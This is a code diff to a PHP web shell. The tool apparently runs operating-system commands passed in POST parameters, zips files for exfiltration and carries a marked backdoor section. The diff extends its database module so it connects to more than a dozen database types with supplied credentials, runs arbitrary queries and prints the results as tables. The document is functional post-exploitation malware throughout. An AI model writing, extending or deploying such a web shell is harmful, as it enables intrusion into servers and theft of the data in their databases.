@@ -111,6 +111,13 @@ $CSS = '__CSS__';
 /// UTILITY FUNCTIONS //
 ////////////////////////
 
+// Fix for PHP < 5.5
+if (!function_exists("array_column")) {
+    function array_column($array, $column_name) {
+        return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
+    }
+}
+
 /**
  * Check if the request method is POST
  *
@@ -939,7 +946,7 @@ function handleCreateZip() {
     if (!extension_loaded('zip')) {
         echo makeExfiltratePage();
         openCommandOutputScreen();
-        echo "Error: Zip extension is not loaded.";
+        echo "Error: Zip extension is not loaded.\n";
         closeCommandOutputScreen();
         return;
     }
@@ -950,7 +957,7 @@ function handleCreateZip() {
     if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
         echo makeExfiltratePage();
         openCommandOutputScreen();
-        echo "Error: Could not create temporary archive.";
+        echo "Error: Could not create temporary archive.\n";
         closeCommandOutputScreen();
         return;
     }
@@ -1171,6 +1178,89 @@ function listEnabledExtensions() {
 }
 
 /**
+ * Run a PDO query and output the results
+ *
+ * @param $pdo PDO PDO connection to use
+ * @param $query string Query to run
+ *
+ * @return void
+ */
+function runPDOQuery($pdo, $query) {
+    $stmt = $pdo->query($query);
+    if ($stmt) {
+        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
+        if ($result) {
+            echo "[Driver: PDO] Query executed successfully.\n";
+            printAsciiTable($result);
+        }
+        else {
+            echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
+        }
+    }
+    else {
+        echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
+    }
+}
+
+/**
+ * Print an ASCII table from the given data
+ *
+ * @param $data
+ *
+ * @return void
+ */
+function printAsciiTable($data) {
+    // Get column headers
+    $headers = array_keys($data[0]);
+
+    // Calculate column widths
+    $columnWidths = array();
+    foreach ($headers as $header) {
+        $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
+    }
+
+    // Print top row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+
+    // Print header row
+    echo "|";
+    foreach ($headers as $header) {
+        printf("%-{$columnWidths[$header]}s|", $header);
+    }
+    echo PHP_EOL;
+
+    // Print divider row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+
+    // Print table rows
+    foreach ($data as $row) {
+        echo "|";
+        foreach ($row as $key => $value) {
+            printf("%-{$columnWidths[$key]}s|", $value);
+        }
+        echo PHP_EOL;
+    }
+
+    // Print bottom row
+    echo "+";
+    foreach ($headers as $header) {
+        echo str_repeat("-", $columnWidths[$header]);
+        echo "+";
+    }
+    echo PHP_EOL;
+}
+
+/**
  * Connect to a database using the given credentials and return the connection
  *
  * @param $db_type string Database type
@@ -1191,9 +1281,9 @@ function listEnabledExtensions() {
  * @param $enableScrollableCursors string Whether to enable scrollable cursors
  * @param $raw_connection_string string Raw connection string to use for connection
  *
- * @return resource|mysqli|PDO|MongoDB\Driver\Manager|Mongo|null
+ * @return void
  */
-function connectToDatabase(
+function connectAndQueryDatabase(
     $db_type,
     $username,
     $password,
@@ -1210,7 +1300,9 @@ function connectToDatabase(
     $server = null,
     $protocol = "onsoctcp",
     $enableScrollableCursors = null,
-    $raw_connection_string = ""
+    $raw_connection_string = "",
+    $query = null,
+    $collection = null
 ) {
     if ($db_type === 'mysql') {
         $port = $port ?: 3306;
@@ -1223,10 +1315,23 @@ function connectToDatabase(
                 echo "[Driver: mysql] Connection failed: " . mysql_error();
             }
             else {
-                echo "[Driver: mysql] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: mysql] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = mysql_query($query, $connection);
+                    echo "[Driver: mysql] Query executed successfully.\n";
+                    if ($result) {
+                        $rows = array();
+                        while ($row = mysql_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: mysql] Query failed: " . mysql_error();
+                    }
+                }
+            }
         }
         // Check if the MySQLi extension is loaded
         elseif (extension_loaded("mysqli")) {
@@ -1238,14 +1343,26 @@ function connectToDatabase(
                     echo "[Driver: mysqli] Connection failed: " . mysqli_connect_error();
                 }
                 else {
-                    echo "[Driver: mysqli] Connected successfully using $username:$password.";
-                }
+                    echo "[Driver: mysqli] Connected successfully using $username:$password.\n";
 
-                return $connection ?: null;
+                    if (!empty($query)) {
+                        $result = mysqli_query($connection, $query);
+                        if ($result) {
+                            echo "[Driver: mysqli] Query executed successfully.\n";
+                            $rows = array();
+                            while ($row = mysqli_fetch_assoc($result)) {
+                                $rows[] = $row;
+                            }
+                            printAsciiTable($rows);
+                        }
+                        else {
+                            echo "[Driver: mysql] Query failed: " . mysqli_error($connection);
+                        }
+                    }
+                }
             }
             catch (mysqli_sql_exception $e) {
                 echo "[Driver: mysqli] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the PDO MySQL extension is loaded
@@ -1256,22 +1373,22 @@ function connectToDatabase(
                        (!empty($charset) ? ";charset=$charset" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_mysql] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_mysql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_mysql] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
         elseif (extension_loaded("pdo")) {
-            echo "PDO extension is loaded but PDO MySQL driver is not installed.";
-            return null;
+            echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
         }
         else {
-            echo "MySQL extension is not loaded.";
-            return null;
+            echo "[Driver: none] MySQL extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'cubrid') {
@@ -1285,12 +1402,14 @@ function connectToDatabase(
                        (!empty($charset) ? ";charset=$charset" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_cubrid] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_cubrid] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the CUBRID extension is loaded
@@ -1301,14 +1420,26 @@ function connectToDatabase(
                 echo "[Driver: cubrid] Connection failed: " . cubrid_error_msg();
             }
             else {
-                echo "[Driver: cubrid] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: cubrid] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = cubrid_query($query, $connection);
+                    if ($result) {
+                        echo "[Driver: cubrid] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = cubrid_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: cubrid] Query failed: " . cubrid_error($connection);
+                    }
+                }
+            }
         }
         else {
-            echo "CUBRID extension is not loaded.";
-            return null;
+            echo "[Driver: none] CUBRID extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'pgsql') {
@@ -1320,12 +1451,14 @@ function connectToDatabase(
                 $dsn = "pgsql:host=$host;port=$port" . (!empty($database) ? ";dbname=$database" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_pgsql] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_pgsql] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the PostgreSQL extension is loaded
@@ -1336,14 +1469,26 @@ function connectToDatabase(
                 echo "[Driver: pgsql] Connection failed: " . pg_last_error();
             }
             else {
-                echo "[Driver: pgsql] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: pgsql] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = pg_query($connection, $query);
+                    if ($result) {
+                        echo "[Driver: pgsql] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = pg_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: pgsql] Query failed: " . pg_last_error($connection);
+                    }
+                }
+            }
         }
         else {
-            echo "PostgreSQL extension is not loaded.";
-            return null;
+            echo "[Driver: none] PostgreSQL extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'sqlite') {
@@ -1353,12 +1498,14 @@ function connectToDatabase(
                 $dsn = "sqlite:$host";
 
                 $pdo = new PDO($dsn);
-                echo "[Driver: pdo_sqlite] Connected successfully using $host.";
-                return $pdo;
+                echo "[Driver: pdo_sqlite] Connected successfully using $host.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_sqlite] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the SQLite extension is loaded
@@ -1369,14 +1516,26 @@ function connectToDatabase(
                 echo "[Driver: sqlite3] Connection failed: $error";
             }
             else {
-                echo "[Driver: sqlite3] Connected successfully using $host.";
-            }
+                echo "[Driver: sqlite3] Connected successfully using $host.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = sqlite_query($connection, $query);
+                    if ($result) {
+                        echo "[Driver: sqlite3] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = sqlite_fetch_array($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: sqlite3] Query failed: " . sqlite_error_string(sqlite_last_error($connection));
+                    }
+                }
+            }
         }
         else {
-            echo "SQLite extension is not loaded.";
-            return null;
+            echo "[Driver: none] SQLite extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'sqlsrv') {
@@ -1388,12 +1547,14 @@ function connectToDatabase(
                 $dsn = "sqlsrv:Server=$host,$port" . (!empty($database) ? ";Database=$database" : "");
 
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_sqlsrv] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_sqlsrv] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the SQL Server extension is loaded
@@ -1403,7 +1564,7 @@ function connectToDatabase(
 
             if (!$connection) {
                 echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
-                echo "Trying to connect to $host,$port ...";
+                echo "[Driver: sqlsrv] Trying to connect to $host,$port ...\n";
 
                 $connection = sqlsrv_connect(
                     "$host,$port",
@@ -1414,18 +1575,30 @@ function connectToDatabase(
                     echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
                 }
                 else {
-                    echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).";
+                    echo "[Driver: sqlsrv] Connected successfully using $username:$password (host,port).\n";
                 }
             }
             else {
-                echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).";
+                echo "[Driver: sqlsrv] Connected successfully using $username:$password (host only).\n";
             }
 
-            return $connection ?: null;
+            if (!empty($query) && $connection) {
+                $result = sqlsrv_query($connection, $query);
+                if ($result) {
+                    echo "[Driver: sqlsrv] Query executed successfully.\n";
+                    $rows = array();
+                    while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+                else {
+                    echo "[Driver: sqlsrv] Query failed: " . sqlsrv_errors();
+                }
+            }
         }
         else {
-            echo "SQL Server extension is not loaded.";
-            return null;
+            echo "[Driver: none] SQL Server extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'oci') {
@@ -1443,12 +1616,14 @@ function connectToDatabase(
                 $dsn = "oci:dbname=$tns";
 
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_oci] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_oci] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_oci] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the Oracle extension is loaded
@@ -1459,14 +1634,31 @@ function connectToDatabase(
                 echo "[Driver: oci8] Connection failed: " . oci_error();
             }
             else {
-                echo "[Driver: oci8] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: oci8] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $statement = oci_parse($connection, $query);
+                    if ($statement) {
+                        if (oci_execute($statement)) {
+                            echo "[Driver: oci8] Query executed successfully.\n";
+                            $rows = array();
+                            while ($row = oci_fetch_assoc($statement)) {
+                                $rows[] = $row;
+                            }
+                            printAsciiTable($rows);
+                        }
+                        else {
+                            echo "[Driver: oci8] Query failed: " . oci_error($statement);
+                        }
+                    }
+                    else {
+                        echo "[Driver: oci8] Query failed: " . oci_error($connection);
+                    }
+                }
+            }
         }
         else {
-            echo "Oracle extension is not loaded.";
-            return null;
+            echo "[Driver: none] Oracle extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'mongodb') {
@@ -1477,28 +1669,49 @@ function connectToDatabase(
         if (extension_loaded("mongodb")) {
             try {
                 $connection = new MongoDB\Driver\Manager($dsn, explode("&", $options));
-                echo "[Driver: mongodb] Connected successfully using $username:$password.";
-                return $connection;
+                echo "[Driver: mongodb] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $query  = new MongoDB\Driver\Query(array());
+                    $cursor = $connection->executeQuery("$database.$collection", $query);
+
+                    $rows = array();
+                    foreach ($cursor as $row) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
             }
             catch (MongoDB\Driver\Exception\Exception $e) {
                 echo "[Driver: mongodb] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the Mongo extension is loaded
         elseif (extension_loaded("mongo")) {
             try {
                 $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
-                echo "[Driver: mongo] Connected successfully using $username:$password.";
-                return $connection;
+                echo "[Driver: mongo] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    $collection = $connection->selectCollection($database, $collection);
+                    $cursor     = $collection->find();
+
+                    $rows = array();
+                    foreach ($cursor as $row) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
             }
             catch (MongoConnectionException $e) {
                 echo "[Driver: mongo] Connection failed: " . $e->getMessage();
             }
+            catch (Exception $e) {
+                echo "[Driver: mongo] Connection failed: " . $e->getMessage();
+            }
         }
         else {
-            echo "MongoDB extension is not loaded.";
-            return null;
+            echo "[Driver: none] MongoDB extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'ibm') {
@@ -1509,12 +1722,14 @@ function connectToDatabase(
         if (extension_loaded("pdo_ibm")) {
             try {
                 $pdo = new PDO($dsn);
-                echo "[Driver: pdo_ibm] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_ibm] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_ibm] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the IBM extension is loaded
@@ -1525,14 +1740,26 @@ function connectToDatabase(
                 echo "[Driver: ibm] Connection failed: " . db2_conn_error();
             }
             else {
-                echo "[Driver: ibm] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: ibm] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = db2_exec($connection, $query);
+                    if ($result) {
+                        echo "[Driver: ibm] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = db2_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: ibm] Query failed: " . db2_conn_error();
+                    }
+                }
+            }
         }
         else {
-            echo "IBM extension is not loaded.";
-            return null;
+            echo "[Driver: none] IBM extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'firebird') {
@@ -1546,28 +1773,30 @@ function connectToDatabase(
         if (extension_loaded("pdo_firebird")) {
             try {
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_firebird] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_firebird] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_firebird] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the Firebird extension is loaded
         elseif (extension_loaded("interbase")) {
-            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...";
+            echo "Connecting to $host/$port:$database (TCP/IP on custom port) ...\n";
             $connection = ibase_connect($host . "/" . $port . ":" . $database, $username, $password);
 
             if (!$connection) {
                 echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
-                echo "Trying to connect to $host:$database (TCP/IP implicit port) ...";
+                echo "[Driver: interbase] Trying to connect to $host:$database (TCP/IP implicit port) ...\n";
 
                 $connection = ibase_connect($host . ":" . $database, $username, $password);
 
                 if (!$connection) {
                     echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
-                    echo "Trying to connect to //$host/$database (NetBEUI) ...";
+                    echo "[Driver: interbase] Trying to connect to //$host/$database (NetBEUI) ...\n";
 
                     $connection = ibase_connect("//" . $host . "/" . $database, $username, $password);
 
@@ -1575,22 +1804,34 @@ function connectToDatabase(
                         echo "[Driver: interbase] Connection failed: " . ibase_errmsg();
                     }
                     else {
-                        echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).";
+                        echo "[Driver: interbase] Connected successfully using $username:$password (//host/database aka NetBEUI).\n";
                     }
                 }
                 else {
-                    echo "[Driver: interbase] Connected successfully using $username:$password (host:database).";
+                    echo "[Driver: interbase] Connected successfully using $username:$password (host:database).\n";
                 }
             }
             else {
-                echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).";
+                echo "[Driver: interbase] Connected successfully using $username:$password (host/port:database).\n";
             }
 
-            return $connection ?: null;
+            if (!empty($query) && $connection) {
+                $result = ibase_query($connection, $query);
+                if ($result) {
+                    echo "[Driver: interbase] Query executed successfully.\n";
+                    $rows = array();
+                    while ($row = ibase_fetch_assoc($result)) {
+                        $rows[] = $row;
+                    }
+                    printAsciiTable($rows);
+                }
+                else {
+                    echo "[Driver: interbase] Query failed: " . ibase_errmsg();
+                }
+            }
         }
         else {
-            echo "Firebird extension is not loaded.";
-            return null;
+            echo "[Driver: none] Firebird extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'odbc') {
@@ -1600,12 +1841,14 @@ function connectToDatabase(
         if (extension_loaded("pdo_odbc")) {
             try {
                 $pdo = new PDO($dsn);
-                echo "[Driver: pdo_odbc] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_odbc] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_odbc] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the ODBC extension is loaded
@@ -1616,14 +1859,26 @@ function connectToDatabase(
                 echo "[Driver: odbc] Connection failed: " . odbc_errormsg();
             }
             else {
-                echo "[Driver: odbc] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: odbc] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = odbc_exec($connection, $query);
+                    if ($result) {
+                        echo "[Driver: odbc] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = odbc_fetch_array($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: odbc] Query failed: " . odbc_errormsg();
+                    }
+                }
+            }
         }
         else {
-            echo "ODBC extension is not loaded.";
-            return null;
+            echo "[Driver: none] ODBC extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'informix') {
@@ -1634,17 +1889,18 @@ function connectToDatabase(
         if (extension_loaded("pdo_informix")) {
             try {
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_informix] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_informix] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_informix] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         else {
-            echo "Informix extension is not loaded.";
-            return null;
+            echo "[Driver: none] Informix extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'sybase') {
@@ -1655,12 +1911,14 @@ function connectToDatabase(
         if (extension_loaded("pdo_dblib")) {
             try {
                 $pdo = new PDO($dsn, $username, $password);
-                echo "[Driver: pdo_dblib] Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: pdo_dblib] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
                 echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
-                return null;
             }
         }
         // Check if the Sybase extension is loaded
@@ -1671,10 +1929,23 @@ function connectToDatabase(
                 echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
             }
             else {
-                echo "[Driver: sybase] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: sybase] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = sybase_query($query, $connection);
+                    if ($result) {
+                        echo "[Driver: sybase] Query executed successfully.\n";
+                        $rows = array();
+                        while ($row = sybase_fetch_assoc($result)) {
+                            $rows[] = $row;
+                        }
+                        printAsciiTable($rows);
+                    }
+                    else {
+                        echo "[Driver: sybase] Query failed: " . sybase_get_last_message();
+                    }
+                }
+            }
         }
         // Check if the FreeTDS extension is loaded
         elseif (extension_loaded("mssql")) {
@@ -1684,14 +1955,24 @@ function connectToDatabase(
                 echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
             }
             else {
-                echo "[Driver: mssql] Connected successfully using $username:$password.";
-            }
+                echo "[Driver: mssql] Connected successfully using $username:$password.\n";
 
-            return $connection ?: null;
+                if (!empty($query)) {
+                    $result = mssql_query($query, $connection);
+                    if ($result) {
+                        echo "Query executed successfully.\n";
+                        while ($row = mssql_fetch_assoc($result)) {
+                            echo json_encode($row);
+                        }
+                    }
+                    else {
+                        echo "Query failed: " . mssql_get_last_message();
+                    }
+                }
+            }
         }
         else {
-            echo "Sybase extension is not loaded.";
-            return null;
+            echo "[Driver: none] Sybase extension is not loaded.\n";
         }
     }
     elseif ($db_type === 'raw') {
@@ -1701,22 +1982,23 @@ function connectToDatabase(
         if (extension_loaded("pdo")) {
             try {
                 $pdo = new PDO($dsn, $username, $password);
-                echo "Connected successfully using $username:$password.";
-                return $pdo;
+                echo "[Driver: PDO] Connected successfully using $username:$password.\n";
+
+                if (!empty($query)) {
+                    runPDOQuery($pdo, $query);
+                }
             }
             catch (PDOException $e) {
-                echo "Connection failed: " . $e->getMessage();
-                return null;
+                echo "[Driver: PDO] Connection failed: " . $e->getMessage();
             }
         }
         else {
-            echo "PDO extension is not loaded.";
-            return null;
+            echo "[Driver: PDO] PDO extension is not loaded.\n";
         }
     }
-
-    echo "Unsupported database type: $db_type";
-    return null;
+    else {
+        echo "[Driver: none] Unsupported database type: $db_type";
+    }
 }
 
 // TEMPLATE DEVELOPMENT BACKDOOR - START
@@ -2188,11 +2470,27 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "ol_informix1170",
                                 "The Informix server name to use for the connection."
                             ),
+                            makeInput(
+                                "textarea",
+                                "Query",
+                                "__PARAM_18__",
+                                "SHOW DATABASES",
+                                "The query to run against the database. Leave empty to perform a connection test."
+                            ),
+                            makeInput(
+                                "text",
+                                "Collection",
+                                "__PARAM_19__",
+                                "users",
+                                "The collection to query against for MongoDB."
+                            ),
                             '<script>
                                 function hideAll() {
                                     for (let i = 2; i <= 17; i++) {
                                         document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
                                     }
+                                    
+                                    document.getElementById(`__PARAM_19__-container`).classList.add(`hidden`);
                                 }
                                 
                                 function showRange(start, end) {
@@ -2233,6 +2531,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         case `mongodb`:
                                             showRange(2, 6);
                                             showRange(10, 10);
+                                            showRange(19, 19);
                                             break;
                                         case `firebird`:
                                             showRange(2, 7);
@@ -2292,7 +2591,7 @@ if (isPost()) {
             system($_POST["__PARAM_1__"]);
             break;
         case $QUERY_DATABASES:
-            $connection = connectToDatabase(
+            $connection = connectAndQueryDatabase(
                 $_POST["__PARAM_1__"],
                 $_POST["__PARAM_4__"],
                 $_POST["__PARAM_5__"],
@@ -2309,7 +2608,9 @@ if (isPost()) {
                 $_POST["__PARAM_17__"],
                 $_POST["__PARAM_13__"],
                 $_POST["__PARAM_14__"],
-                $_POST["__PARAM_16__"]
+                $_POST["__PARAM_16__"],
+                $_POST["__PARAM_18__"],
+                $_POST["__PARAM_19__"]
             );
 
             /*if ($pdo) {
